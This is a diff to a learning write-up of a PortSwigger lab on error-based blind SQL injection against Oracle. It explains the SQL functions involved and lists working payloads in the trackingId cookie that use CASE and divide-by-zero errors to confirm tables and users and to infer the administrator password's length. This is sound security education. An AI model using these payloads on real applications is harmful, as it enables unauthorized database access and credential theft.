@@ -12,23 +12,33 @@ Retrieve the password of `administrator` user and log into their account
 
 ## Background  
 ### Blind SQL injection  
-Blind SQL injection occurs when an application is vulnerable to SQL injection, but the results of the injected query are not directly displayed in the response.  
+Blind SQL injection occurs when an application is vulnerable to SQL injection, but the results of the injected query are not directly displayed in the response. Instead, information must be inferred from differences in the application's behavior.   
+In this lab, an SQL error is intentionally triggered when a specified condition is true. The resulting `500 Internal Server Error` can therefore be used as a Boolean indicator.
 
 ### `LENGTH()`  
 `LENGTH()` returns the number of characters in a string.  
 
 ### `SUBSTR()`  
-With Oracle database, we use SUBSTR() instead of SUBSTRING()
+With Oracle database, `SUBSTR()` is used to extract part of a string  
 `SUBSTR()` extracts a specific part of a string using the following syntax:  
-SUBSTRING(string, start, length)    
+SUBSTR(string, start, length)    
 For example: `SUBSTR(password,1,1)`  
 `password`: the string to extract characters from.  
 `1` (second parameter): the starting position of the character to extract. Positions start from 1.  
 `1` (third parameter): the number of characters to extract.   
 
 ### [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-#### Use || on Oracle  
-#### Use CASE 
+#### String concatenation on Oracle  
+Oracle uses `||` to concatenate strings  
+**For example:**
+'abc' || 'def' produces: 'abcdef'
+#### Using `CASE`
+`CASE` can execute different expressions depending on whether a condition is true or false. The general structure is:
+```text
+CASE WHEN condition THEN value1 ELSE value2 END
+```
+In this lab, `CASE` is used to trigger a database error only when the specified condition is true.
+
 ### Oracle-specific note
 On **Oracle** databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.  
 There is a built-in table on **Oracle** called `dual` which you can use for this purpose.  
@@ -46,8 +56,9 @@ The important parameter in this lab is the `trackingId` cookie
 
 ### 2. Confirm the parameter is vulnerable to blind SQL injection   
 To determine whether `trackingId` could be manipulated, I injected 2 payloads:  
-`'||(SELECT '' FROM dual)||'`: this got status `200 OK`. While
-`'||(SELECT '' FROM dualhdb)||'` got `Internal Server Error`  
+`'||(SELECT '' FROM dual)||'` This returned `200 OK`. Now, I changed `dual` to an invalid table name:  
+`'||(SELECT '' FROM dualhdb)||'` This resulted in `Internal Server Error`  
+The different responses confirmed that the injected SQL was being evaluated by the database.
 
 ### 3. Confirm that `users` table exists  
 To confirm that the users table exists, I injected:
@@ -70,8 +81,8 @@ Then, I changed the condition to:
 ```
 This returned `200 OK`    
 This confirms that I could use the error response as a true/false indicator:
-`500 Internal Server Error` condition is true  
-`200 OK` condition is false   
+`500 Internal Server Error` -> condition is true  
+`200 OK` -> condition is false   
 
 ### 5. Confirm that `administrator` user exists  
 I injected:  
@@ -81,11 +92,11 @@ I injected:
 I got `500 Internal Server Error`, indicating that the administrator user exists  
 
 ### 6. Identify the password length  
-I injected 2 payloads: 
+Firstly, I tested: 
 ```text
 '||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
-I got `Internal Server Error`
+The response was `500 Internal Server Error`
 ```text
 '||(SELECT CASE WHEN LENGTH(password)>30 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
